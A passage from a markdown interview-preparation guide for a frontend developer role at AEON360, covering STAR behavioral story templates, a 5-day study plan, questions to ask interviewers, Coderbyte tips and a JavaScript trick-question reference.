> "My goal was to [deliver feature / meet deadline / ensure quality] without causing team friction."
>
> **Action:** (How did you handle it?)  
> "I scheduled a 30-minute discussion. I presented a doc comparing both approaches with pros/cons and a small POC showing [data/benchmark]. I listened to their concerns about [X]. We agreed to [compromise / go with Y / escalate to tech lead for final decision]."
>
> **Result:** (What happened?)  
> "We shipped [approach] on time. [Measurable outcome, e.g., performance improved by X%, no bugs in production, team learned something new]."

**Red flags to avoid:**

- âŒ "They were wrong, I was right" (arrogance)
- âŒ "I just did what they said even though I disagreed" (no ownership)
- âŒ Blaming the other person ("They didn't listen")

**AEON360-specific angle:**

- AEON works on client projects (Odoo, ERP integrations). Mention balancing **client requests vs technical best practices**.
- Example: "Client wanted feature X in 2 days, but I knew it would create tech debt. I proposed a phased approach: MVP in 2 days, full solution in 2 weeks. Client agreed after I showed a Figma mockup of both versions."

---

#### Category 2: Ownership & Driving Projects

**Common questions:**

- "Tell me about a project you led from idea to production."
- "Describe a time you took initiative without being asked."
- "Give an example of a project you drove that had significant impact."

**What they're testing:**

- Do you wait for instructions or proactively solve problems?
- Can you see projects through from start to finish?
- Do you think about business impact, not just technical execution?

**Story Template:**

> **Situation:** (What problem did you notice?)  
> "I noticed [problem / opportunity]. No one was actively working on it, but it was impacting [users / team / business]."
>
> **Task:** (What did you decide to do?)  
> "I decided to [propose solution / build POC / gather data] to demonstrate the value."
>
> **Action:** (How did you drive it?)  
> "I [wrote a proposal / built a prototype / presented to stakeholders]. I coordinated with [design / backend / product] to scope it. I broke it into [X] phases and owned [specific phase]. I ran daily standups to unblock issues and adjusted scope when [constraint appeared]."
>
> **Result:** (What was the impact?)  
> "[Metric improved by X% / saved Y hours per week / increased revenue by $Z]. The project is now [maintained by the team / part of the core product]."

**Red flags to avoid:**

- âŒ "I did everything myself" (no collaboration)
- âŒ "It was mostly done, I just finished it" (not true ownership)
- âŒ No measurable result ("it went well")

**AEON360-specific angle:**

- AEON emphasizes **Agile** and **client collaboration**. Mention:
  - Running sprint planning, backlog refinement
  - Balancing multiple client projects
  - Proactively communicating blockers to clients (cadrage phase)

Example: "I noticed our Odoo integration module had no automated tests, causing frequent regressions. I proposed adding Cypress E2E tests. I wrote a test plan, got approval in sprint planning, and delivered 20 tests in 2 sprints. Regressions dropped from 5 per sprint to 1."

---

#### Category 3: Handling Failure & Learning

**Common questions:**

- "Tell me about a time you failed."
- "Describe a bug you caused that impacted users. How did you handle it?"
- "What's the biggest mistake you made and what did you learn?"

**What they're testing:**

- Can you admit mistakes without deflecting blame?
- Do you learn from failure?
- How do you handle pressure and recover?

**Story Template:**

> **Situation:** (What went wrong?)  
> "I [deployed a feature / made a change] that caused [production issue / user impact]."
>
> **Task:** (What was your responsibility?)  
> "My responsibility was to [fix it immediately / prevent future occurrences]."
>
> **Action:** (What did you do?)  
> "I [rolled back the change / hotfixed / communicated to users]. I investigated the root cause and found [missed edge case / missing test / incorrect assumption]. I added [tests / monitoring / code review checklist] to prevent it. I documented the incident in a postmortem and shared with the team."
>
> **Result:** (What was the outcome and learning?)  
> "The issue was resolved in [X minutes]. We implemented [new process] and haven't had that issue since. I learned to [specific lesson, e.g., always test with production data, never skip staging]."

**Red flags to avoid:**

- âŒ Blaming others ("PM gave me wrong requirements")
- âŒ Downplaying impact ("It wasn't a big deal")
- âŒ No learning ("It just happened")

**AEON360-specific angle:**

- Mention **incident response** and **client communication**.
- Example: "I pushed a change that broke the Odoo invoice generation for a client. I immediately rolled back, notified the client within 10 minutes, and had a fix ready in 30 minutes. I added a pre-deploy checklist and a staging environment smoke test. Client appreciated the transparency and we kept the contract."

---

#### Category 4: Cross-Functional Collaboration

**Common questions:**

- "Describe a time you worked with a designer/PM/backend engineer when requirements were unclear."
- "Tell me about a time you had to explain a technical concept to a non-technical stakeholder."
- "How do you handle feedback from design that conflicts with technical constraints?"

**What they're testing:**

- Can you translate between technical and non-technical language?
- Do you respect other disciplines (design, product, backend)?
- Can you find solutions when requirements are ambiguous?

**Story Template:**

> **Situation:** (What was the collaboration challenge?)  
> "I was working with [designer / PM / backend team] on [project]. [They wanted X, but Y was technically complex / requirements were vague / timelines didn't align]."
>
> **Task:** (What did you need to achieve?)  
> "I needed to [align on scope / translate technical constraints / find a compromise]."
>
> **Action:** (How did you collaborate?)  
> "I [scheduled a workshop / built a prototype / drew diagrams] to explain [technical limitation / alternative approach]. I asked questions to understand [their goals / user needs]. We agreed on [solution] that balanced [design vision / technical feasibility / timeline]."
>
> **Result:** (What was the outcome?)  
> "We shipped on time. [User feedback was positive / feature met business goal / team learned to collaborate better on future projects]."

**Red flags to avoid:**

- âŒ "Design didn't understand technical constraints" (dismissive)
- âŒ "I just built what they asked" (no critical thinking)
- âŒ "I ignored their feedback" (poor collaboration)

**AEON360-specific angle:**

- AEON works directly with clients (banking, insurance, government). Emphasize:
  - **Client education** (explaining technical trade-offs in business terms)
  - **Agile ceremonies** (sprint reviews, demos to clients)
  - **Cross-team coordination** (frontend, backend, Odoo consultants)

Example: "A banking client wanted real-time transaction updates, but their legacy API only supported polling every 30 seconds. I built a demo showing polling vs WebSocket, explained the infrastructure cost difference, and proposed a hybrid: polling for now, WebSocket in Phase 2. Client agreed and we delivered Phase 1 on budget."

---

#### Category 5: Adapting to Changing Requirements

**Common questions:**

- "Tell me about a time requirements changed mid-project. How did you adapt?"
- "Describe a situation where you had to pivot your approach."
- "How do you handle scope creep?"

**What they're testing:**

- Are you flexible or rigid?
- Can you re-prioritize under pressure?
- Do you push back on unrealistic changes or just accept everything?

**Story Template:**

> **Situation:** (What changed?)  
> "I was [X weeks into a project] when [stakeholder / PM / client] changed the requirements to [new scope]."
>
> **Task:** (What was your challenge?)  
> "I needed to [deliver on time / re-scope / communicate impact] without sacrificing quality."
>
> **Action:** (How did you adapt?)  
> "I [assessed the impact / re-estimated effort / proposed alternatives]. I presented [new timeline / reduced scope / phased approach] to stakeholders. I re-prioritized tasks and [cut low-value features / negotiated deadline extension / brought in help]."
>
> **Result:** (What happened?)  
> "We delivered [on time / slightly delayed but with full scope / MVP first, rest later]. [Client was satisfied / team avoided burnout / learned to set better expectations upfront]."

**Red flags to avoid:**

- âŒ "I just worked nights and weekends" (unsustainable, no negotiation)
- âŒ "I said no and refused" (inflexible)
- âŒ "We missed the deadline" with no explanation of mitigation

**AEON360-specific angle:**

- AEON's 4-phase methodology (**Cadrage â†’ Conception â†’ DÃ©veloppement â†’ Livraison**) likely has built-in checkpoints.
- Example: "During the Conception phase, the client added 3 new modules to the Odoo integration. I updated the PRD, flagged the impact on timeline (+2 sprints), and proposed deferring one module to Phase 2. Client agreed, and we delivered core functionality on time."

---

### 9.3 Story Bank Worksheet

**Instructions:** Before your interview, fill out this table with 5 real stories from your experience. Each story should fit one category, but aim to cover all 5 categories.

You can reuse the same story for multiple questions if you frame it differently.

| Category                    | Project Name         | S (Situation - 15s)                   | T (Task - 15s)             | A (Action - 60s)        | R (Result - 30s)      |
| --------------------------- | -------------------- | ------------------------------------- | -------------------------- | ----------------------- | --------------------- |
| **Technical Conflict**      | ******\_\_\_\_****** | Brief context of disagreement         | Your goal                  | What you did to resolve | Measurable outcome    |
| **Ownership & Initiative**  | ******\_\_\_\_****** | Problem you identified                | What you decided to do     | How you drove it        | Impact (metrics)      |
| **Handling Failure**        | ******\_\_\_\_****** | What went wrong                       | Your responsibility        | How you fixed + learned | Recovery + prevention |
| **Cross-Functional Collab** | ******\_\_\_\_****** | Who you worked with, what was unclear | What you needed to achieve | How you collaborated    | Outcome for project   |
| **Adapting to Change**      | ******\_\_\_\_****** | What changed mid-project              | Challenge this created     | How you adapted         | Final result          |

**Example filled row (Technical Conflict):**

| Category           | Project             | S                                                                           | T                                                   | A                                                                                                                                                     | R                                                                                          |
| ------------------ | ------------------- | --------------------------------------------------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| Technical Conflict | E-commerce checkout | Team wanted to use Redux for form state. I thought local state was simpler. | Decide on state management without delaying sprint. | I built 2 POCs (Redux vs useState), measured bundle size (+40KB for Redux), presented in tech review. Team agreed local state was sufficient for MVP. | Shipped 2 days early, no bugs. Team adopted "start simple" principle for future decisions. |

**Tips:**

- âœ… Use bullet points when filling this out (you'll expand to full sentences during the interview)
- âœ… Rehearse each story out loud â€” aim for 2 minutes max
- âœ… Have backup stories â€” if one doesn't fit the question, pivot to another
- âŒ Don't memorize word-for-word (sounds robotic) â€” remember structure and key points

---

### 9.4 Red Flags to Avoid

These patterns make interviewers skeptical. Avoid them:

#### 1. Blaming Others

âŒ **Bad:**  
"My manager gave me unrealistic deadlines."  
"The designer didn't think about technical constraints."  
"The backend team was slow so I couldn't finish."

âœ… **Good (reframe with ownership):**  
"The deadline was tight. I pushed back with data showing the full scope needed 3 weeks, not 1. We negotiated a phased release: core features in week 1, polish in week 3."

"The designer proposed an animation I knew would hurt performance. I built a prototype showing the FPS drop, and we collaborated on a simpler version that kept the visual intent."

"The backend API wasn't ready. I built a mock server with json-server so I could develop in parallel, and integrated the real API in 2 hours once it was ready."

---

#### 2. Vague "We" Statements

âŒ **Bad:**  
"We optimized the database."  
"We decided to use React."  
"We fixed the bug."

âœ… **Good (specific "I" contributions):**  
"I profiled the database queries with EXPLAIN and identified a missing index. I worked with the DBA to add it."

"I researched 3 frameworks (React, Vue, Svelte), compared bundle size and ecosystem maturity, and recommended React because we needed a large component library. The team agreed."

"I traced the bug to a race condition in the useEffect hook. I added an AbortController and wrote a test to catch it in the future."

**Exception:** If it truly was a team effort with no individual ownership, say: "The team decided X together in a design review. My contribution was [specific part]."

---

#### 3. No Measurable Results

âŒ **Bad:**  
"It went well."  
"Users liked it."  
"Performance improved."

âœ… **Good (with metrics):**  
"Load time dropped from 4s to 1.2s."  
"NPS score increased from 45 to 68."  
"Cart abandonment decreased 12%, translating to $30K additional monthly revenue."

**If you don't have exact numbers:**

- Estimate conservatively ("roughly 30% faster")
- Use qualitative + quantitative ("5 customers mentioned it in feedback, and support tickets for slow checkout dropped from 20/week to 3/week")

---

#### 4. Stories Longer Than 2 Minutes

Interviewers zone out after 2 minutes. Practice with a timer.

**Structure:**

- S: 15 seconds
- T: 15 seconds
- A: 60 seconds (bulk of the story)
- R: 30 seconds

**If you run long:**

- Cut background details ("The company was a startup..." â†’ not needed)
- Skip minor actions ("I also refactored some CSS..." â†’ focus on high-impact actions)
- Pause after A and ask: "Would you like more detail on [specific part]?"

---

#### 5. Negative Attitude About Past Employers

âŒ **Bad:**  
"My last company had terrible code quality."  
"The CTO didn't understand modern tech."  
"Management was incompetent."

âœ… **Good (neutral framing):**  
"The codebase had grown organically over 5 years without a clear architecture. I proposed a refactor plan that we executed over 6 months."

"The technical leadership preferred stability over cutting-edge tech. I learned to make pragmatic decisions balancing innovation and risk."

"The company prioritized speed over process. I introduced code reviews and automated testing, which slowed initial velocity by 10% but reduced bugs by 40%."

**Why:** Even if true, badmouthing past employers signals you might do the same to AEON360.

---

### 9.5 Questions to Ask the Interviewer

Asking smart questions signals **seniority** and shows you're evaluating them too.

Prepare 5â€“7 questions. Pick 2â€“3 based on how the interview went.

---

#### Technical Culture (Choose 1â€“2)

1. **"What does your code review process look like? Do you have style guides or automated linting?"**  
   _Why ask:_ Shows you care about code quality and team standards.

2. **"How do you handle technical debt? Do you allocate explicit sprint capacity for refactoring, or is it tackled opportunistically?"**  
   _Why ask:_ Tests whether they balance feature velocity with long-term maintainability.

3. **"Can you walk me through how a typical project moves from Cadrage to Livraison? Where do engineers get involved?"**  
   _Why ask:_ AEON-specific; shows you researched their 4-phase methodology.

4. **"What's your approach to balancing client requests with technical best practices? Any examples where you pushed back?"**  
   _Why ask:_ AEON works on client projects; this tests how they handle scope creep.

---

#### Process & Workflow (Choose 1â€“2)

5. **"How do you manage multiple client projects concurrently? Do engineers work on one client at a time or context-switch?"**  
   _Why ask:_ AEON likely juggles 5â€“10 clients. This affects your day-to-day focus.

6. **"What does your deployment process look like? How frequently do you deploy to production?"**  
   _Why ask:_ Tests engineering maturity (daily deploys vs monthly releases).

7. **"How do you handle production incidents? Is there an on-call rotation, or does the person who wrote the code fix it?"**  
   _Why ask:_ Reveals work-life balance and ownership culture.

8. **"What tools do you use for project management? I saw you use Jira â€” how structured are your sprints?"**  
   _Why ask:_ AEON mentions Jira and Scrum; this tests how rigidly they follow Agile.

---

#### Growth & Career (Choose 1â€“2)

9. **"What learning opportunities exist? Conference budget, internal tech talks, dedicated time for learning new tech?"**  
   _Why ask:_ Signals you're invested in long-term growth, not just a paycheck.

10. **"How do you mentor junior engineers? Is there a structured program or more ad-hoc?"**  
    _Why ask:_ Even as an IC, you may mentor juniors. This tests their investment in team growth.

11. **"What does the career path look like for an IC engineer here? Can you reach principal/staff level without managing people?"**  
    _Why ask:_ Critical if you want to stay technical long-term. Some companies force ICs into management.

12. **"What's the most exciting project the team has worked on in the past year?"**  
    _Why ask:_ Open-ended; lets them brag. Reveals what they're proud of.

---

#### Red Flags to Watch For in Their Answers

- ðŸš© "We don't really do code reviews" â†’ low quality bar
- ðŸš© "Engineers work 60-hour weeks during busy season" â†’ unsustainable
- ðŸš© "We deploy once a month" â†’ slow feedback loop, likely waterfall not Agile
- ðŸš© "We don't have time for testing" â†’ tech debt nightmare
- ðŸš© Vague answers to process questions â†’ chaotic, no structure

---

### Summary Checklist: Behavioral Interview Prep

Before June 9th:

- [ ] Fill out the Story Bank Worksheet (9.3) with 5 real stories
- [ ] Rehearse each story out loud â€” aim for 2 minutes max
- [ ] Identify 1 backup story per category (in case they ask multiple questions in one area)
- [ ] Print or memorize 5â€“7 questions to ask the interviewer (9.5)
- [ ] Practice the "reframing blame" skill â€” take a past frustration and rephrase it neutrally
- [ ] Review AEON360's methodology (Cadrage â†’ Conception â†’ DÃ©veloppement â†’ Livraison) so you can reference it naturally

**Day before interview:**

- Skim your Story Bank Worksheet bullet points (don't memorize word-for-word)
- Pick your top 3 questions to ask based on what you most care about
- Get 8 hours of sleep

**During interview:**

- Listen carefully to the question â€” answer what they asked, not what you prepared
- If a question doesn't fit your prepared stories, say: "Let me think of a good example..." (10 seconds of silence is okay)
- If you blank on a story, pivot: "I don't have a perfect example for that, but here's a related situation where [close enough]"

You're ready. Trust your prep.

---

## Phase 10 â€” 5-Day Study Plan (June 4â€“9, 2026)

**Your goal:** Be interview-ready by Monday, June 9th. This plan balances system design, behavioral prep, and reinforcing your technical foundation â€” without burning out.

**Daily time budget:** 2â€“3 hours (adjust if you have more/less availability)

---

### June 4 (Wednesday) â€” System Design Foundations

**Morning (60 min)**

- [ ] Read **Section 8.1 (Whiteboard Coding Tips)** and **8.2 (System Design Framework)**
- [ ] Write out the 5-step framework on paper:
  1. Clarify requirements
  2. Sketch component tree
  3. Define state & data flow
  4. Performance & accessibility
  5. Testing & edge cases
- [ ] Keep this paper with you â€” use it as a reference for the next 5 days

**Afternoon (75 min)**

- [ ] Work through **Example 1: Autocomplete Search**
  - Read the full example (30 min)
  - On paper/whiteboard, redraw the component tree without looking (10 min)
  - Write the state structure (TypeScript types) from memory (10 min)
  - Explain out loud (as if to an interviewer): "Here's how debouncing works..." (5 min)
- [ ] Work through **Example 2: Infinite Scroll Feed**
  - Read the full example (30 min)
  - Identify the 3 key concepts: Intersection Observer, cursor pagination, optimistic updates
  - Sketch the data flow on paper (5 min)

**Evening (30 min)**

- [ ] Practice whiteboarding Example 1 on paper
  - Set a timer for 15 minutes
  - Write the `AutocompleteSearch` component signature, state, and debounced effect (pseudocode is fine)
  - Narrate out loud as you write: "I'm using useRef here to store the abort controller..."
- [ ] Review any concepts you struggled with (look back at Phase 1 if needed: closures, useEffect, refs)

**Checkpoint:**  
âœ… Can you draw the component tree and explain the state flow for autocomplete search without looking at the guide?  
âœ… Can you explain what `AbortController` does and why it prevents race conditions?

---

### June 5 (Thursday) â€” Advanced System Design + Security/Performance Refresh

**Morning (90 min)**

- [ ] Work through **Example 3: Real-Time Dashboard with WebSocket**
  - Read the full example (40 min)
  - Write out the WebSocket lifecycle on paper: open â†’ message â†’ error â†’ close â†’ reconnect (5 min)
  - Explain out loud: "If the connection drops, I use exponential backoff to retry..." (5 min)
- [ ] Work through **Example 4: Multi-Step Form Wizard**
  - Read the full example (30 min)
  - List the 3 state management options (local state, URL params, Context) and when to use each (5 min)
  - Sketch the form validation flow on paper (5 min)

**Afternoon (60 min)**

- [ ] Practice whiteboarding Example 3 on paper
  - Set a timer for 20 minutes
  - Write the WebSocket connection logic (pseudocode)
  - Include: onopen, onmessage, onclose, reconnect with backoff
  - Narrate your reasoning
- [ ] Review **Phase 4: Security** (existing content)
  - Refresh OAuth2 + PKCE flow (can you draw it in 2 minutes?)
  - Refresh XSS vs CSRF (one-sentence definition + mitigation for each)
- [ ] Review **Phase 5: Performance** (existing content)
  - Refresh Core Web Vitals (LCP, FID, CLS â€” what does each measure?)
  - Refresh code splitting, lazy loading, caching strategies

**Evening (30 min)**

- [ ] Skim **Section 8.4 (Trade-Off Discussion Templates)**
  - Pick 3 trade-offs and practice answering out loud:
    - "When would you use useState vs Context?"
    - "When does infinite scroll need virtualization?"
    - "Debounce vs throttle â€” when to use each?"

**Checkpoint:**  
âœ… Can you explain the WebSocket reconnection strategy (exponential backoff, fallback to polling)?  
âœ… Can you draw the OAuth2 Authorization Code flow from memory?  
âœ… Do you remember all 3 Core Web Vitals and what they measure?

---

### June 6 (Friday) â€” System Design Wrap-Up + Behavioral Prep Kickoff

**Morning (60 min)**

- [ ] Work through **Example 5: Image Gallery with Lazy Loading**
  - Read the full example (30 min)
  - Explain out loud: "Intersection Observer triggers image load when in viewport..." (5 min)
  - Write the filter state + URL sync logic on paper (10 min)
- [ ] Skim **Section 8.5 (Anti-Patterns to Avoid)**
  - Read all 6 anti-patterns (15 min)
  - For each, think of a past project where you could have fallen into that trap

**Afternoon (90 min)**

- [ ] Read **Section 9.1: STAR Format Explained** (30 min)
  - Study the Good vs Bad examples
  - Note the structure: S (15s) â†’ T (15s) â†’ A (60s) â†’ R (30s) = 2 min total
- [ ] Read **Section 9.2: Five Core Question Categories** (60 min)
  - Read all 5 categories:
    1. Technical Conflict
    2. Ownership & Initiative
    3. Handling Failure
    4. Cross-Functional Collaboration
    5. Adapting to Change
  - For each category, think of **one** story from your past experience (don't write it yet, just identify which project)

**Evening (45 min)**

- [ ] Fill out the **Story Bank Worksheet (Section 9.3)**
  - Use bullet points (full sentences come later)
  - Aim for 5 stories, one per category
  - Include measurable results (even rough estimates)

**Checkpoint:**  
âœ… Do you have 5 stories identified (one per behavioral category)?  
âœ… Can you state the STAR format from memory (S â†’ T â†’ A â†’ R)?  
âœ… Can you name all 5 system design examples you've studied (autocomplete, infinite scroll, WebSocket, form wizard, image gallery)?

---

### June 7 (Saturday) â€” Behavioral Rehearsal + Whiteboard Drills

**Morning (90 min)**

- [ ] Rehearse all 5 STAR stories **out loud** (60 min)
  - Set a timer for 2 minutes per story
  - Stand up (or sit at a desk) as if you're in the interview
  - Speak clearly, don't rush
  - If you go over 2 minutes, note where you rambled and trim it
- [ ] Record yourself (phone voice memo) for 2 stories (30 min)
  - Listen back â€” do you sound confident?
  - Check for filler words ("um," "like," "you know")
  - Check for "we" vs "I" â€” rephrase to emphasize your ownership

**Afternoon (75 min)**

- [ ] Whiteboard practice â€” **2 random system design examples** (60 min)
  - Close the guide
  - Pick 2 examples at random (use a dice roll or random.org):
    1. Autocomplete
    2. Infinite Scroll
    3. WebSocket Dashboard
    4. Form Wizard
    5. Image Gallery
  - For each:
    - Write the component tree (5 min)
    - Write the state structure (5 min)
    - Write the key logic (fetch, WebSocket, validation, etc.) in pseudocode (15 min)
    - Narrate as you go
- [ ] Review any weak spots (15 min)
  - Did you forget how Intersection Observer works? Re-read Example 2 & 5.
  - Did you forget TypeScript generics syntax? Skim Phase 1.

**Evening (45 min)**

- [ ] Review **Non-Negotiables Checklist** (existing section in guide)
  - Go through each item â€” can you answer/code all of them?
  - Drill any you're shaky on:
    - Event delegation
    - `useEffect` cleanup
    - `useCallback` vs unnecessary overhead
    - JWT storage tradeoffs
    - XSS vs CSRF
- [ ] Read **Quick Reference â€” Trick Questions** table (existing section)
  - Memorize the tricky ones (`typeof null`, `0.1 + 0.2 === 0.3`, etc.)

**Checkpoint:**  
âœ… Can you tell each STAR story in under 2 minutes?  
âœ… Can you whiteboard any of the 5 system design examples in 15â€“20 minutes with clear narration?  
âœ… Can you answer every item on the Non-Negotiables Checklist?

---

### June 8 (Sunday) â€” Final Review + Rest

**Morning (90 min max â€” then STOP studying)**

- [ ] **Skim all 5 system design examples** (30 min)
  - Don't re-read in full
  - Just glance at the component trees, state structures, and key code snippets
  - Refresh the "Common Interview Questions" at the end of each example
- [ ] **Review Questions to Ask the Interviewer (Section 9.5)** (15 min)
  - Pick your top 5 questions
  - Write them on a small card or note (you can bring this to the interview if it's not a whiteboard-only session)
- [ ] **Skim Section 8.1 (Whiteboard Coding Tips)** again (10 min)
  - Refresh: narrate constantly, write function signatures first, leave space for edits
- [ ] **Glance at your Story Bank Worksheet bullet points** (10 min)
  - Don't rehearse full stories â€” just refresh the key points (S, T, A, R)
- [ ] **Review Phase 2 (React)** if you have time (25 min)
  - Refresh: compound components, render props, `useCallback`/`useMemo` tradeoffs
  - These often come up in technical discussions during behavioral rounds

**Afternoon + Evening: NO STUDYING**

- [ ] Do something unrelated to coding:
  - Walk, exercise, watch a movie, cook, hang out with friends/family
  - Your brain needs rest to consolidate what you've learned
- [ ] Prepare logistics:
  - Lay out clothes for tomorrow (dress one level above casual â€” business casual is safe)
  - Check interview location/time (set 2 alarms)
  - Print a copy of the guide if you want it for last-minute review tomorrow morning (optional)
  - Charge your phone/laptop if it's a virtual interview
- [ ] Get 8 hours of sleep
  - Set a bedtime that gives you 8 hours before your alarm
  - Avoid caffeine after 2 PM
  - No screens 1 hour before bed (read a book or listen to calm music)

**Checkpoint:**  
âœ… Do you feel reasonably confident (not 100% perfect, but prepared)?  
âœ… Are logistics sorted (clothes, location, time)?  
âœ… Did you rest this afternoon/evening?

---

### June 9 (Monday) â€” Interview Day

**Morning (before interview)**

**If your interview is at 9 AM:**

- Wake up 2 hours early (7 AM)
- Light breakfast (avoid heavy food that makes you sluggish)
- 20-minute review ONLY:
  - [ ] Glance at one system design example (pick your favorite)
  - [ ] Glance at your Story Bank Worksheet (bullet points only)
  - [ ] Read Questions to Ask Interviewer (Section 9.5)
- Arrive 10 minutes early (or log in 5 minutes early if virtual)

**If your interview is in the afternoon:**

- Follow your normal morning routine
- Do a light 30-minute review mid-morning (same checklist as above)
- Eat a normal lunch (not too heavy)
- Arrive/log in 10 minutes early

**During the interview:**

**System Design / Technical Round:**

- [ ] **Clarify requirements first** (use the 5-step framework from 8.2)
  - Don't dive straight into code
  - Ask: scale? performance budget? browser support? accessibility?
- [ ] **Narrate constantly**
  - "I'm using a ref here to track the abort controller..."
  - "This could be a performance bottleneck, so I'd memoize it..."
- [ ] **Draw diagrams before code**
  - Component tree on whiteboard
  - State structure (TypeScript types)
  - Then write the key logic
- [ ] **Acknowledge edge cases**
  - "I should handle null here, but I'm skipping for brevity..."
  - "In production, I'd add error boundaries..."
- [ ] **If you get stuck:**
  - Say: "Let me think out loud for a moment..."
  - Walk through the problem step by step
  - Ask for a hint if needed ("I'm blanking on the Intersection Observer API â€” can I assume it exists and move on?")

**Behavioral Round:**

- [ ] **Listen carefully to the question**
  - Don't just recite your prepared story if it doesn't fit
  - Pause for 5 seconds to pick the best story
- [ ] **Use STAR format**
  - Situation (15s) â†’ Task (15s) â†’ Action (60s) â†’ Result (30s)
  - Aim for 2 minutes max
- [ ] **Emphasize "I" not "we"**
  - "I profiled the API..." not "We profiled the API..."
- [ ] **Include measurable results**
  - "Load time dropped from 4s to 1.2s" (not "it got faster")
- [ ] **If they interrupt or ask follow-up:**
  - That's a good sign â€” they're engaged
  - Answer briefly and ask if they want more detail

**At the end:**

- [ ] **Ask 2â€“3 of your prepared questions** (from Section 9.5)
  - Pick based on what wasn't already answered during the interview
  - Avoid yes/no questions â€” ask open-ended ones
- [ ] **Thank them for their time**
  - "I really enjoyed learning about [specific project they mentioned]. Thanks for the thoughtful questions."

**After the interview:**

- [ ] **Debrief (optional but helpful for growth)**
  - Write down:
    - What questions they asked
    - What you answered well
    - What you struggled with
    - What surprised you
  - If you get the offer: celebrate!
  - If you don't: use your notes to improve for the next interview

---

### Summary: What You've Accomplished in 5 Days

By June 9th, you will have:

âœ… **Mastered 5 frontend system design patterns** (autocomplete, infinite scroll, WebSocket, form wizard, image gallery)  
âœ… **Practiced whiteboard coding** with narration (the #1 skill for physical interviews)  
âœ… **Prepared 5 STAR-format behavioral stories** covering all major question categories  
âœ… **Refreshed your technical foundation** (JS/TS, React, security, performance)  
âœ… **Prepared 5 smart questions** to ask the interviewer (signals seniority)  
âœ… **Rested properly** (no burnout, peak mental performance on interview day)

---

### Emergency: "I Have Less Than 5 Days"

If your interview was moved up or you're starting late:

**2-day plan (June 7â€“8):**

- Day 1: System design framework (8.2) + Examples 1, 2, 3 (whiteboard practice for 1 example)
- Day 2: STAR format (9.1) + fill out Story Bank (9.3) + rehearse 3 stories + review Non-Negotiables Checklist

**1-day plan (June 8):**

- Morning: System design framework (8.2) + Example 1 (autocomplete) + whiteboard practice
- Afternoon: STAR format (9.1) + draft 3 stories (conflict, ownership, failure)
- Evening: Review Non-Negotiables Checklist + Questions to Ask Interviewer (9.5)

**Day-of prep (June 9 morning only):**

- Read Section 8.1 (Whiteboard Tips) + 8.2 (Framework)
- Read Section 9.1 (STAR Format) + skim one example per category (9.2)
- Review Non-Negotiables Checklist
- Accept that you won't be 100% prepared â€” but showing clear thinking and communication will carry you far

---

### Final Encouragement

You've already passed the **hardest filter** â€” the Coderbyte assessment. That proves you can code under pressure.

The physical interview tests **different skills:**

- Can you architect solutions at a high level?
- Can you explain your reasoning clearly?
- Can you collaborate and take feedback?
- Do you learn from mistakes?

These are **learnable skills**, and you now have a structured plan to demonstrate them.

Trust your prep. Stay calm. Communicate clearly. You've got this.

**Good luck on June 9th!**

---

---

## Coderbyte Strategy Guide

### Before you start any challenge

1. Read the problem statement fully before touching the editor.
2. Note the **exact expected output format** â€” auto-grading is strict.
3. Identify the input/output types (string? array? object?).
4. Write 2 example cases mentally or on paper.

### Time management

| Challenge type        | Time target    |
| --------------------- | -------------- |
| Algorithmic (easy)    | 10â€“15 min    |
| Algorithmic (medium)  | 20â€“30 min    |
| Frontend UI component | 30â€“45 min    |
| Concept / MCQ         | 1â€“2 min each |

A working but incomplete solution beats a perfect unfinished one. Always submit something.

### Frontend challenge approach

1. **Structure first** â€” write the JSX/HTML skeleton
2. **State second** â€” identify what state is needed, wire it up
3. **Logic third** â€” add event handlers and business logic
4. **Style last** â€” basic Flexbox/Grid to match the spec

### Algorithmic problem patterns

| Pattern        | When to use                        |
| -------------- | ---------------------------------- |
| Two pointers   | Sorted array, find pair/triplet    |
| Sliding window | Subarray/substring of length k     |
| HashMap/Set    | Count frequencies, find duplicates |
| Stack          | Balanced brackets, undo operations |
| Recursion      | Tree traversal, divide and conquer |

```js
// HashMap frequency count â€” appears constantly
function firstNonRepeating(str) {
  const freq = {};
  for (const ch of str) freq[ch] = (freq[ch] ?? 0) + 1;
  return str.split("").find((ch) => freq[ch] === 1) ?? "";
}
```

---

## Non-negotiables checklist

Before your interview, you must be able to answer or code these without hesitation:

- [ ] Explain the difference between `==` and `===`
- [ ] Explain event delegation and why it's useful
- [ ] Write a `useEffect` that fetches data and cleans up the request on unmount
- [ ] Explain when to use `useCallback` vs when it's unnecessary overhead
- [ ] Describe the JWT storage options and their security tradeoffs
- [ ] Explain XSS vs CSRF â€” one sentence each, plus the primary mitigation
- [ ] Name all 3 Core Web Vitals and what each measures
- [ ] Write a React controlled form with validation from scratch
- [ ] Explain what `Promise.all` does and when to use it vs sequential awaits
- [ ] Describe the OAuth2 Authorization Code flow in 5 steps

---

## Quick reference â€” things interviewers often trick you on

| Trap                                | Correct answer                                                   |
| ----------------------------------- | ---------------------------------------------------------------- |
| `typeof null`                       | `"object"` (historical bug in JS)                                |
| `0.1 + 0.2 === 0.3`                 | `false` (floating point precision)                               |
| `[] == false`                       | `true` (type coercion â€” reason to always use `===`)            |
| `var` in a loop with setTimeout     | Captures the final value, use `let` instead                      |
| Mutating state directly in React    | Never â€” always return a new reference                          |
| `useEffect` with missing dependency | Stale closure â€” always add all referenced values to deps array |
| Storing JWT in localStorage         | Security risk â€” prefer httpOnly cookie                         |
| `async/await` without try/catch     | Unhandled rejection â€” always wrap in try/catch                 |
